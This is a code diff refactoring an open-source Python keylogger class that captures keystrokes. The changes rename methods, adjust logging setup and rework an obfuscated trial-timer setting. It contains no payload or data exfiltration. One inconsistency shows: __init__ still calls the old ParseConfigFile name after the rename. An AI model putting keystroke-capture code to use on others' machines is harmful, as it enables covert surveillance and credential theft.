@@ -51,6 +51,7 @@ import Queue
 from Queue import Empty # to avoid some weird exceptions on exit
 import threading
 import logging
+from myutils import _settings, _cmdoptions
 
 class KeyLogger:
     '''Captures all keystrokes, enqueue events.
@@ -60,9 +61,9 @@ class KeyLogger:
        
        '''
     def __init__(self):
-        self.ParseOptions() # stored in self.cmdoptions
+        self.parse_options() # stored in self.cmdoptions
         self.ParseConfigFile() # stored in self.settings
-        self.ParseControlKey()
+        self.parse_control_key()
         self.NagscreenLogic()
         self.process_settings()
         os.chdir(self.settings['General']['Log Directory'])
@@ -115,7 +116,7 @@ class KeyLogger:
            
            '''
         log_dir = os.path.normpath(self.settings['General']['Log Directory'])
-        if os.path.isabs(self.settings['General']['Log Directory']):
+        if os.path.isabs(log_dir):
             self.settings['General']['Log Directory'] = log_dir
         else:
             self.settings['General']['Log Directory'] = \
@@ -123,44 +124,37 @@ class KeyLogger:
         
         # Regexp filter for the non-allowed characters in windows filenames.
         self.filter = re.compile(r"[\\\/\:\*\?\"\<\>\|]+")
-        self.settings['General']['Log File'] = \
-           self.filter.sub(r'__',self.settings['General']['Log File'])
+        
         self.settings['General']['System Log'] = \
            self.filter.sub(r'__',self.settings['General']['System Log'])
-        
-        # todo: also want to run imagesdirectoryname (tbc) through self.filter 
-        
-    def ParseControlKey(self):
+                
+    def parse_control_key(self):
         self.ControlKeyHash = \
            ControlKeyHash(self.settings['General']['Control Key'])
     
     def create_loggers(self):
     
         # configure default root logger to log all debug messages to stdout
-        logging.basicConfig(level=logging.DEBUG,
-                        format='%(asctime)s %(name)-12s %(levelname)-8s %(message)s',
-                        stream = sys.stdout) 
+        if self.cmdoptions.debug:
+            loglevel = logging.DEBUG
+        else:
+            loglevel = logging.INFO
+        
+        logging.basicConfig(level=loglevel,
+                format='%(asctime)s %(name)-12s %(levelname)-8s %(message)s',
+                stream = sys.stdout) 
         
         # configure the "systemlog" handler to log all debug messages to file
         if self.settings['General']['System Log'] != 'None':
-            systemlogpath = os.path.join(self.settings['General']['Log Directory'], 
-                                                        self.settings['General']['System Log'])
+            systemlogpath = os.path.join(
+                    self.settings['General']['Log Directory'], 
+                    self.settings['General']['System Log'])
             systemloghandler = logging.FileHandler(systemlogpath)
             systemloghandler.setLevel(logging.DEBUG)
             systemlogformatter = logging.Formatter('%(asctime)s %(name)-12s %(levelname)-8s %(message)s')
             systemloghandler.setFormatter(systemlogformatter)
             logging.getLogger('').addHandler(systemloghandler)
-        
-        # configure the main data logger
-        mainlogger = logging.getLogger('mainlog')
-        mainlogpath = os.path.join(self.settings['General']['Log Directory'], 
-                                                self.settings['General']['Log File'])
-        mainloghandler = myutils.OnDemandRotatingFileHandler(logpath)
-        mainloghandler.setLevel(logging.INFO)
-        mainlogformatter = logging.Formatter('%(message)s')
-        mainloghandler.setFormatter(mainlogformatter)
-        mainlogger.addHandler(mainloghandler)
-    
+            
     def OnKeyDownEvent(self, event):
         '''Called when a key is pressed.
         
@@ -173,7 +167,8 @@ class KeyLogger:
         self.ControlKeyHash.update(event)
         
         if self.cmdoptions.debug:
-                self.lw.PrintDebug("control key status: " + str(self.ControlKeyHash))
+            logging.getLogger('').debug("control key status: " + \
+                    str(self.ControlKeyHash))
                 
         # We have to open the panel from main thread on windows, otherwise it
         # hangs. This is possibly due to some interaction with the python
@@ -184,7 +179,7 @@ class KeyLogger:
         if os.name == 'nt':
             if self.ControlKeyHash.check():
                 if not self.panel:
-                    self.lw.PrintDebug("starting panel")
+                    logging.getLogger('').debug("starting panel")
                     self.panel = True
                     self.ControlKeyHash.reset()
                     PyKeyloggerControlPanel(self.cmdoptions, self)
@@ -209,7 +204,7 @@ class KeyLogger:
         #print threading.enumerate()
         sys.exit()
     
-    def ParseOptions(self):
+    def parse_options(self):
         '''Read command line options.'''
         version_str = version.description + " version " + version.version + \
                       " (" + version.url + ")."
@@ -232,7 +227,7 @@ class KeyLogger:
         
         self.cmdoptions, args = parser.parse_args()
     
-    def ParseConfigFile(self):
+    def parse_config_file(self):
         '''Reads config file options from .ini file.
         
            Filename as specified by "--configfile" option,
@@ -298,14 +293,14 @@ class KeyLogger:
             del(warn)
             
             # set the timer if first use
-            utfnd = self.settings['General']['Usage Time Flag NoDisplay']
+            utfnd = self.settings['General']['_Usage Time Flag']
             if myutils.password_recover(utfnd) == "firstuse":
-                self.settings['General']['Usage Time Flag NoDisplay'] = \
+                self.settings['General']['_Usage Time Flag'] = \
                    myutils.password_obfuscate(str(time.time()))
                 self.settings.write()
             
             # then, see if we have "expired"
-            utfnd = self.settings['General']['Usage Time Flag NoDisplay']
+            utfnd = self.settings['General']['_Usage Time Flag']
             if abs(time.time() - float(myutils.password_recover(utfnd))) > \
                3600 * 24 * 4:
                 root = Tkinter.Tk()
